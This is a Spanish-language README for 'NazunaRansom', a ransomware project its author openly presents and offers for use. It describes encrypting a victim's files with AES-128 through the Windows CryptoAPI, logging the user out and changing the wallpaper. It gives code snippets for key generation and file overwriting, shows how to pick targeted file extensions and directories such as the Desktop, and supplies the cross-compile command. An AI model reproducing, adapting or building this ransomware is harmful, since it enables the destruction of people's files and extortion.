# NazunaRansom
Nazuna Ransomware v1 es un ransomware inspirado en mi waifu (Nazuna)

### Caracteristica

- Usa cifrado AES-128 en modo CBC
- Cierra la sesion del usuario
- Cambia el fondo de pantalla
- Cifra los subdirectorios de un directorio dado

### Funciones de cifrado

**CryptAcquireContext**

```c++
if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
  if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
    return false;
  }
}
```
En el primer if trata de obtener el identificador del contenedor CSP, ```nazuna.hProv``` funciona como un puntero que almacena el identificador CSP, si no se puede obtener el identifcador se vuelva a llamar a ```CryptAcquireContext``` con ```CRYPT_NEWKEYSET``` para crear un contenedor de claves en CSP

**CryptGenKey**

```c++
CryptGenKey(nazuna.hProv, CALG_AES_128, CRYPT_EXPORTABLE, &nazuna.hkey);
```
Genera una key AES-128 de acuerdo al identificador del CSP y la key la almacena en ```nazuna.hkey```

**CryptEncrypt**

```c++
CryptEncrypt(nazuna.hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
```
Cifra los datos de acuerdo al CSP, ```buf``` es un puntero al buffer datos que contiene los datos que se van a cifrar, ```bytes_leer``` es la cantidad de bytes que se van a cifrar, que son los bytes del archivo original, esta funcion tambien funcionara para que el buffer cifrado se sobreescriba por el original 

### Modificaciones

Dentro de la funcion ```recorrer_dir``` puedes especificar las extensiones que quieres que se cifren:

```c++
if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx")
```

En la funcion ```main``` puedes especificar otro directorio que se va a cifrar

```c++
string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
```
Solo modifica ```Desktop``` por otra, ej: ```Documents```

### Compilado
Yo lo compile desde GNU/Linux con el comando

```bash
x86_64-w64-mingw32-g++ -o NazunaRansom NazunaRansom.cpp -lbcrypt -static -static-libgcc -static-libstdc++ -lurlmon
```
